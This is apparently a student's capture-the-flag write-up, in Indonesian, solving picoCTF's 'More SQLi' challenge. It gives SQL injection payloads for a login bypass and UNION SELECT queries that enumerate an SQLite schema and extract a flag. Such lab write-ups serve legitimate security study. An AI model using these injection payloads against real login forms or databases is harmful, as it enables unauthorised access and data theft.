# Soal 1 picoctf: More SQLi

## Randist Prawandha Putera 5027231059

# Langkah-langkah pengerjaan
- gunakan simple payload yaitu ' OR '1'='1'-- di pass dan user
<img width="1079" height="925" alt="image" src="https://github.com/user-attachments/assets/2a635496-3143-4ac1-8d27-3e7c5f260cf7" />
- setelah kita berhasil masuk kita bisa amati di burpsuite terdapat database dengan jenis sqlite
- gunakan payload (Algiers' UNION SELECT sql,1,1 FROM sqlite_master --) pada kolom search 
<img width="1079" height="914" alt="image" src="https://github.com/user-attachments/assets/92d87e94-f14f-491e-b145-8f62ff1da7f9" />
- setelah kita amati di burp suite, kita dapatkan tempat flag ada di more table, search lagi dengan modifikasi payload berikut
(Algiers' UNION SELECT flag,id,1 FROM more_table --) 
<img width="1079" height="890" alt="image" src="https://github.com/user-attachments/assets/b45f5734-f201-4351-99f1-5515609decb4" />
flag di dapatkan
